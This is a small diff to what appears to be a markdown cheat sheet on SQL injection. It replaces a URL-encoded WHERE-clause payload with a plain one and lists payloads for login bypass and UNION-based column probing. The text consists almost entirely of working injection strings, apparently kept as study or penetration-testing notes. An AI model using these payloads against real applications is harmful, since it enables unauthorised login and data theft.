@@ -18,7 +18,7 @@
 ## Exploitation
 - Login Bypass
   - Username : ```administrator'--```
-- Where cluase : ```'+OR+1=1--``` 
+- Where cluase : ```' OR 1=1--``` 
 - UNION attack
   - determining the number of columns : ```' UNION SELECT NULL--``` , ```' UNION SELECT NULL,NULL--``` , ...
   - finding a column containing text : ```' UNION SELECT 'abcdef',NULL,NULL--``` , ```' UNION SELECT NULL,'abcdef',NULL--``` , ...
